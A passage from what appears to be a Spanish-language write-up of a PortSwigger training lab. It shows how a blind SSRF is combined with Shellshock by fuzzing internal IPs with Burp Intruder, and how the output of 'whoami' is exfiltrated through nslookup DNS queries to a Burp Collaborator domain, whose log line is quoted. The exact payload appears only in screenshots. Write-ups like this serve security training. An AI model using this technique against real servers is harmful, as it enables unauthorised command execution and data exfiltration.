![uno](/assets/images/LabsSSRF/lab7/uno.png)

Vemos que hemos agregado el payload en el final de la IP, esto para irla fuzzeando del 1 hasta el 254, y para esto iremos a payloads, y configuraremos lo siguiente:

![payloads](/assets/images/LabsSSRF/lab7/payloads.png)

Así que ahora vemos que configuramos el payload de tipo numérico, que irá en secuencia del 1 al 254, avanzando de 1 en 1.

Así que nos hará 254 peticiones fuzzeando ese valor al dar al start attack:

![254](/assets/images/LabsSSRF/lab7/254.png)

Todas se tramitaron correctamente, así que ahora iremos al apartado de BurpCollaborator y apreciar si recibimos algo:

![DNS](/assets/images/LabsSSRF/lab7/dns.png)

Podemos leer en la respuesta que ha funcionado nuestro SSRF para acontecer un Shellshock.

Podemos ver la siguiente respuesta:

**"The Collaborator server received a DNS lookup of type A for the domain name peter-qxVswP.75afxrv2m8w5l5o1fx52kjq9i0orcg.burpcollaborator.net."**

Vemos que primero nos dice peter-qxVswP, seguido de la respuesta por defecto.

En resumen aprovechamos el SSRF para a través de un shellshock recibir consultas DNS hacia nuestro servidor y como aprovechamos que con el comando nslookup podemos hacer que el servidor trámite peticiones DNS entonces incluimos lo que nos interesa en la respuesta DNS en este caso el comando whoami.

Y habremos terminado el laboratorio al poner ese usuario en la flag:

![end](/assets/images/LabsSSRF/lab7/end.png)

Y con este habremos completado todos los laboratorios de SSRF en Portswigger.
